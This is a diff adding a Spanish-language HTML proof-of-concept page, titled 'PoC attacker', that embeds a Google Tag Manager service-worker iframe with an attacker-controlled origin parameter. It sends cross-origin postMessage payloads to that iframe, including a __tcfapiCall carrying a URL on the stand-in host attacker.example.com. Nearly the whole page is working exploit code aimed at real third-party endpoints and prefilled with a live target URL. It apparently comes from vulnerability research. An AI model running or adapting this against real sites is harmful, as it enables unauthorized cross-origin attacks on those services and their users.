@@ -1,0 +1,94 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>PoC attacker — postMessage to sw_iframe</title>
+  <style>
+    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial; padding: 18px; }
+    iframe { border: 1px solid #ccc; width: 100%; height: 520px; }
+    button { margin-right: 8px; padding: 8px 12px; }
+    .notice { background:#fff3cd; border:1px solid #ffeeba; padding:8px; margin:8px 0; }
+    pre { background:#f6f8fa; padding:8px; overflow:auto; }
+  </style>
+</head>
+<body>
+  <h1>PoC attacker — postMessage</h1>
+  <p>Este PoC embebe el iframe objetivo añadiendo <code>?origin=TU_ORIGIN</code> automáticamente y permite enviar <code>postMessage</code> desde la página atacante.</p>
+
+  <div class="notice">
+    <strong>Antes de usar:</strong> pega la URL del iframe objetivo (sin query string) en el campo de abajo.
+    Ejemplo: <code>https://www.googletagmanager.com/static/service_worker/5940/sw_iframe.html</code>
+  </div>
+
+  <label for="targetUrl">URL del iframe objetivo (sin ?origin):</label>
+  <input id="targetUrl" style="width:100%" placeholder="https://api.myfitnesspal.com/path/to/sw_iframe.html" />
+
+  <p style="margin-top:8px">
+    <button id="load">Cargar iframe con origin=this.origin</button>
+    <button id="sendPing" disabled>Enviar ping</button>
+    <button id="sendUrl" disabled>Enviar payload con url</button>
+  </p>
+
+  <iframe id="targetFrame" srcdoc="<p>Iframe no cargado</p>"></iframe>
+
+  <h3>Consola del PoC (mensajes entrantes del iframe):</h3>
+  <pre id="log">Esperando...</pre>
+
+  <script>
+    const input = document.getElementById('targetUrl');
+    const btnLoad = document.getElementById('load');
+    const btnPing = document.getElementById('sendPing');
+    const btnUrl = document.getElementById('sendUrl');
+    const iframe = document.getElementById('targetFrame');
+    const log = document.getElementById('log');
+
+    function appendLog(...args) {
+      const now = new Date().toISOString();
+      log.textContent = (log.textContent === 'Esperando...' ? '' : log.textContent + '\n') + now + '  ' + args.map(a => typeof a === 'object' ? JSON.stringify(a) : a).join(' ');
+      log.scrollTop = log.scrollHeight;
+    }
+
+    // recibe mensajes del iframe (si el iframe responde)
+    window.addEventListener('message', (e) => {
+      try {
+        appendLog('[from iframe]', 'origin=' + e.origin, 'data=' + (typeof e.data === 'string' ? e.data : JSON.stringify(e.data)));
+      } catch (err) {
+        appendLog('[from iframe] error reading message', err);
+      }
+    }, false);
+
+    btnLoad.addEventListener('click', () => {
+      const base = input.value.trim();
+      if (!base) { alert('Rellena la URL del iframe objetivo.'); return; }
+      // añade origin param = location.origin
+      const src = base + '?origin=' + encodeURIComponent(location.origin);
+      iframe.src = src;
+      appendLog('[action] iframe cargado en src=', src);
+      // habilitar botones tras unos segundos (espera carga)
+      setTimeout(() => { btnPing.disabled = false; btnUrl.disabled = false; }, 800);
+    });
+
+    function send(payload) {
+      if (!iframe.contentWindow) { appendLog('[error] iframe.contentWindow no listo'); return; }
+      try {
+        iframe.contentWindow.postMessage(JSON.stringify(payload), '*');
+        appendLog('[sent]', payload);
+      } catch (err) {
+        appendLog('[send error]', err);
+      }
+    }
+
+    btnPing.addEventListener('click', () => {
+      send({ __tcfapiCall: { command: "ping", version: 2, callId: "poc-crossorigin" }});
+    });
+
+    btnUrl.addEventListener('click', () => {
+      send({ __tcfapiCall: { command: "test", parameter: { url: "https://attacker.example.com/mal" }, callId: "poc-url" }});
+    });
+
+    // prefill ejemplo
+    input.value = 'https://www.googletagmanager.com/static/service_worker/5940/sw_iframe.html';
+  </script>
+</body>
+</html>
